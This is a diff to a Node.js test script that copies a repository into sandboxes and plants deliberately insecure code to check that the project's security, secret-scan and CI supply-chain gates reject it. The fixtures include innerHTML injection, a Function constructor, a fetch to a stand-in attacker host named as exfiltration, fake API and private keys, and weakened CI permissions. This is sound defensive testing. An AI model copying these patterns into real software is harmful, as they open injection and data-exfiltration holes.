@@ -1,24 +1,24 @@
-import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
+import { cpSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join, resolve } from 'node:path';
+import { dirname, join, relative, resolve } from 'node:path';
 import { spawnSync } from 'node:child_process';
 
 const root = process.cwd();
 const checker = resolve(root, 'scripts/check-coverage.mjs');
-const sandbox = mkdtempSync(join(tmpdir(), 'elara-coverage-gate-'));
+const coverageSandbox = mkdtempSync(join(tmpdir(), 'elara-coverage-gate-'));
 const metrics = ['lines', 'statements', 'functions', 'branches'];
-const sourcePath = resolve(sandbox, 'src/example.ts');
+const sourcePath = resolve(coverageSandbox, 'src/example.ts');
 
 function metric(pct) { return { total: 100, covered: pct, skipped: 0, pct }; }
 function perfectFileCoverage() {
   return Object.fromEntries(metrics.map((name) => [name, metric(100)]));
 }
 function writeFixture(branchPct, includeSourceEntry = true) {
-  mkdirSync(join(sandbox, 'coverage'), { recursive: true });
-  mkdirSync(join(sandbox, 'scripts'), { recursive: true });
-  mkdirSync(join(sandbox, 'src'), { recursive: true });
+  mkdirSync(join(coverageSandbox, 'coverage'), { recursive: true });
+  mkdirSync(join(coverageSandbox, 'scripts'), { recursive: true });
+  mkdirSync(join(coverageSandbox, 'src'), { recursive: true });
   writeFileSync(sourcePath, 'export const sentinel = 1;\n');
-  writeFileSync(join(sandbox, 'coverage/coverage-summary.json'), JSON.stringify({
+  writeFileSync(join(coverageSandbox, 'coverage/coverage-summary.json'), JSON.stringify({
     total: {
       lines: metric(100),
       statements: metric(100),
@@ -27,7 +27,7 @@ function writeFixture(branchPct, includeSourceEntry = true) {
     },
     ...(includeSourceEntry ? { [sourcePath]: perfectFileCoverage() } : {}),
   }));
-  writeFileSync(join(sandbox, 'scripts/coverage-baseline.json'), JSON.stringify({
+  writeFileSync(join(coverageSandbox, 'scripts/coverage-baseline.json'), JSON.stringify({
     version: 1,
     global: Object.fromEntries(metrics.map((name) => [name, 100])),
     directories: {},
@@ -35,8 +35,76 @@ function writeFixture(branchPct, includeSourceEntry = true) {
   }));
 }
 
+function runNode(cwd, script) {
+  return spawnSync(process.execPath, [resolve(cwd, script)], {
+    cwd,
+    encoding: 'utf8',
+    env: { ...process.env, CI: 'true' },
+  });
+}
+
 function runChecker() {
-  return spawnSync(process.execPath, [checker], { cwd: sandbox, encoding: 'utf8' });
+  return spawnSync(process.execPath, [checker], { cwd: coverageSandbox, encoding: 'utf8' });
+}
+
+const ignoredCopyRoots = new Set([
+  '.git', 'node_modules', 'dist', 'coverage', 'playwright-report', 'test-results', 'dev-dist', '.wrangler',
+]);
+
+function cloneRepository(label) {
+  const sandbox = mkdtempSync(join(tmpdir(), `elara-pass5-${label}-`));
+  cpSync(root, sandbox, {
+    recursive: true,
+    filter(source) {
+      const rel = relative(root, source).replaceAll('\\', '/');
+      if (!rel) return true;
+      return !ignoredCopyRoots.has(rel.split('/')[0]);
+    },
+  });
+  return sandbox;
+}
+
+function writeRelative(cwd, path, content) {
+  const absolute = join(cwd, path);
+  mkdirSync(dirname(absolute), { recursive: true });
+  writeFileSync(absolute, content);
+}
+
+function mutateRelative(cwd, path, mutate) {
+  const absolute = join(cwd, path);
+  writeFileSync(absolute, mutate(readFileSync(absolute, 'utf8')));
+}
+
+const failures = [];
+const adversarialCases = [];
+
+function addMutation(name, gate, expected, mutate) {
+  adversarialCases.push({ name, gate, expected, mutate });
+}
+
+function expectBaseline(gate) {
+  const result = runNode(root, gate);
+  if (result.status !== 0) {
+    failures.push(`baseline gate failed before mutation: ${gate}\n${result.stderr || result.stdout}`);
+  }
+}
+
+function exerciseMutation(testCase) {
+  const sandbox = cloneRepository(testCase.name.replace(/[^a-z0-9]+/gi, '-').toLowerCase());
+  try {
+    testCase.mutate(sandbox);
+    const result = runNode(sandbox, testCase.gate);
+    const output = `${result.stderr || ''}\n${result.stdout || ''}`;
+    if (result.status === 0) {
+      failures.push(`${testCase.name}: gate accepted the deliberate mutation`);
+      return;
+    }
+    if (testCase.expected && !output.includes(testCase.expected)) {
+      failures.push(`${testCase.name}: gate rejected the mutation for the wrong reason\n${output}`);
+    }
+  } finally {
+    rmSync(sandbox, { recursive: true, force: true });
+  }
 }
 
 try {
@@ -64,7 +132,92 @@ try {
     throw new Error(`coverage checker rejected source-inventory mutation for the wrong reason:\n${inventoryMutation.stderr || inventoryMutation.stdout}`);
   }
 
-  process.stdout.write('Coverage gate adversarial sentinel passed: green control accepted; deliberate metric regression and source-inventory disappearance rejected.\n');
+  const gates = [
+    'scripts/security-architecture-gate.mjs',
+    'scripts/secret-scan.mjs',
+    'scripts/check-verification-integrity.mjs',
+    'scripts/supply-chain-gate.mjs',
+    'scripts/reliability-gate.mjs',
+  ];
+  for (const gate of gates) expectBaseline(gate);
+
+  addMutation('raw HTML assignment', 'scripts/security-architecture-gate.mjs', 'direct HTML injection', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export function inject(el: HTMLElement) { el.innerHTML = '<b>owned</b>'; }\n");
+  });
+  addMutation('bracket-notation raw HTML assignment', 'scripts/security-architecture-gate.mjs', 'direct HTML injection', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export function inject(el: HTMLElement) { el['innerHTML'] = '<b>owned</b>'; }\n");
+  });
+  addMutation('Function constructor without new', 'scripts/security-architecture-gate.mjs', 'dynamic Function constructor', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export const execute = Function('return 7');\n");
+  });
+  addMutation('unreviewed global fetch', 'scripts/security-architecture-gate.mjs', 'unreviewed global fetch authority', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export async function exfiltrate() { return fetch('https://attacker.invalid/collect'); }\n");
+  });
+  addMutation('credential-shaped localStorage write', 'scripts/security-architecture-gate.mjs', 'writes a credential-shaped value to localStorage', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export function persist(apiKey: string) { localStorage.setItem('api_key', apiKey); }\n");
+  });
+  addMutation('unreviewed Dexie authority', 'scripts/security-architecture-gate.mjs', 'unreviewed durable Dexie authority', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "import Dexie from 'dexie';\nexport const hostileDb = new Dexie('hostile');\n");
+  });
+
+  addMutation('synthetic Google API key leak', 'scripts/secret-scan.mjs', 'possible Google API key', (cwd) => {
+    const token = 'AIza' + 'A'.repeat(35);
+    writeRelative(cwd, 'src/pass5-secret-fixture.ts', `export const leaked = '${token}';\n`);
+  });
+  addMutation('synthetic private key leak', 'scripts/secret-scan.mjs', 'possible Private key material', (cwd) => {
+    const header = ['-----BEGIN', 'PRIVATE', 'KEY-----'].join(' ');
+    writeRelative(cwd, 'src/pass5-private-key-fixture.txt', `${header}\nnot-a-real-key\n`);
+  });
+
+  addMutation('disabled unit test', 'scripts/check-verification-integrity.mjs', 'contains a disabled, focused, or expected-failure test control', (cwd) => {
+    writeRelative(cwd, 'src/pass5-adversarial.test.ts', "import { test } from 'vitest';\ntest.skip('must run', () => {});\n");
+  });
+  addMutation('Playwright passWithNoTests', 'scripts/check-verification-integrity.mjs', 'Playwright must not allow an empty test suite', (cwd) => {
+    mutateRelative(cwd, 'playwright.config.ts', (source) => source.replace("  testDir: './e2e',", "  testDir: './e2e',\n  passWithNoTests: true,"));
+  });
+  addMutation('E2E imports application source directly', 'scripts/check-verification-integrity.mjs', 'imports application source directly instead of driving a public/user boundary', (cwd) => {
+    writeRelative(cwd, 'e2e/pass5-adversarial.spec.ts', "import '../src/app/App';\n");
+  });
+  addMutation('security gate control removed', 'scripts/check-verification-integrity.mjs', 'security architecture gate lost required capability check', (cwd) => {
+    mutateRelative(cwd, 'scripts/security-architecture-gate.mjs', (source) => source.replace('XMLHttpRequest transport', 'XMLHttpRequest channel'));
+  });
+  addMutation('secret detector control removed', 'scripts/check-verification-integrity.mjs', 'secret scanner lost required detector or fixture policy', (cwd) => {
+    mutateRelative(cwd, 'scripts/secret-scan.mjs', (source) => source.replace('GitHub token', 'GitHub credential'));
+  });
+  addMutation('supply-chain audit control removed', 'scripts/check-verification-integrity.mjs', 'supply-chain gate lost required control', (cwd) => {
+    mutateRelative(cwd, 'scripts/supply-chain-gate.mjs', (source) => source.replace('npm audit signatures', 'npm signature audit'));
+  });
+
+  addMutation('unpinned GitHub Action', 'scripts/supply-chain-gate.mjs', 'GitHub Action is not pinned to a full SHA', (cwd) => {
+    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'actions/checkout@v7'));
+  });
+  addMutation('checkout persists credentials', 'scripts/supply-chain-gate.mjs', 'every checkout must use the exact event SHA and persist-credentials: false', (cwd) => {
+    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('persist-credentials: false', 'persist-credentials: true'));
+  });
+  addMutation('runtime job gains repository write authority', 'scripts/supply-chain-gate.mjs', 'runtime verification job may not have repository write authority', (cwd) => {
+    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('      contents: read\n    steps:', '      contents: write\n    steps:'));
+  });
+  addMutation('deploy job gains unrelated write authority', 'scripts/supply-chain-gate.mjs', 'deploy job permissions changed from the reviewed minimum', (cwd) => {
+    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('      id-token: write\n    environment:', '      id-token: write\n      issues: write\n    environment:'));
+  });
+  addMutation('deploy no longer depends on runtime certification', 'scripts/supply-chain-gate.mjs', 'Pages deploy must depend on Runtime verification', (cwd) => {
+    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('    needs: runtime\n', ''));
+  });
+  addMutation('mutable npm install in CI', 'scripts/supply-chain-gate.mjs', 'CI may not use npm install; use npm ci', (cwd) => {
+    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('npm ci --no-audit --no-fund', 'npm install'));
+  });
+
+  addMutation('floating Node baseline', 'scripts/reliability-gate.mjs', 'Node baseline must remain 24.21.0', (cwd) => {
+    writeRelative(cwd, '.nvmrc', '24\n');
+  });
+
+  for (const testCase of adversarialCases) exerciseMutation(testCase);
+
+  if (failures.length) {
+    throw new Error(`Pass 5 adversarial certification failed (${failures.length}):\n${failures.map((failure) => `- ${failure}`).join('\n')}`);
+  }
+
+  process.stdout.write(`Coverage + Pass 5 adversarial sentinel passed: green controls accepted; deliberate metric regression and source-inventory disappearance rejected; ${adversarialCases.length} hostile mutations failed closed.\n`);
 } finally {
-  rmSync(sandbox, { recursive: true, force: true });
+  rmSync(coverageSandbox, { recursive: true, force: true });
 }
